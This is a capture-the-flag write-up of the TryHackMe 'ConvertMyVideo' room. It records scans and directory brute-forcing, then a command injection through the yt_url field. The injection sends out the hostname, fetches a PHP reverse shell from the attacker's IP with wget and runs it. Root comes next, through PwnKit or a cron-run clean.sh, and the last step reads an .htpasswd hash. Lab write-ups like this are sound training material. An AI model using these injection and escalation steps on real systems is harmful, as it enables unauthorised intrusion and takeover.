https://tryhackme.com/room/convertmyvideo


```
export IP=10.10.12.217;export MYIP=10.4.18.63
```

# nmap
## init
```
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
1066/tcp filtered fpo-fns
5959/tcp filtered unknown
9998/tcp filtered distinct32
```

## ext
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
6272/tcp  filtered unknown
19752/tcp filtered unknown
23314/tcp filtered unknown
33795/tcp filtered unknown
36013/tcp filtered unknown
45764/tcp filtered unknown
52815/tcp filtered unknown
54960/tcp filtered unknown
56325/tcp filtered unknown
57255/tcp filtered unknown
58319/tcp filtered unknown
62029/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# ffuf
```
                        [Status: 200, Size: 747, Words: 154, Lines: 20, Duration: 275ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3501ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4508ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4508ms]
admin                   [Status: 401, Size: 459, Words: 42, Lines: 15, Duration: 273ms]
images                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 272ms]
index.php               [Status: 200, Size: 747, Words: 154, Lines: 20, Duration: 274ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 273ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 271ms]
tmp                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 273ms]
```


# http
## main.js
```

$(function () {
    $("#convert").click(function () {
        $("#message").html("Converting...");
        $.post("/", { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() }, function (data) {
            try {
                data = JSON.parse(data);
                if(data.status == "0"){
                    $("#message").html("<a href='" + data.result_url + "'>Download MP3</a>");
                }
                else{
                    console.log(data);
                    $("#message").html("Oops! something went wrong");
                }
            } catch (error) {
                console.log(data);
                $("#message").html("Oops! something went wrong");
            }
        });
    });

});
```


# RCE
```
GET / HTTP/1.1
...

yt_url=http%3a//10.4.18.63%3a7777/$(hostname)
```

```
id: uid=33(www-data)
whoami: www-data
hostname: dmv
pwd: /var/www/html
$PATH: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

```

```
yt_url=`wget${IFS}http://10.4.18.63/rev.php`
yt_url=`php${IFS}rev.php`
```

# root shell
#pwnkit #kernel_exploit #linux_kernel_exploit #linux_kernel
## Method 1 
Using PwnKit
https://github.com/ly4k/PwnKit
```
$ whoami
www-data
$ ./pwnkit
# whomi
root
```
## Method 2
overwrite `clean.sh` which is run by root user every minute and get a root shell

# TryHackMe objective
user who can access `/admin` dir:
```
# user who can access this directory is found here
$ cat /var/www/html/admin/.htpasswd
itsmeadmin:$................................
```
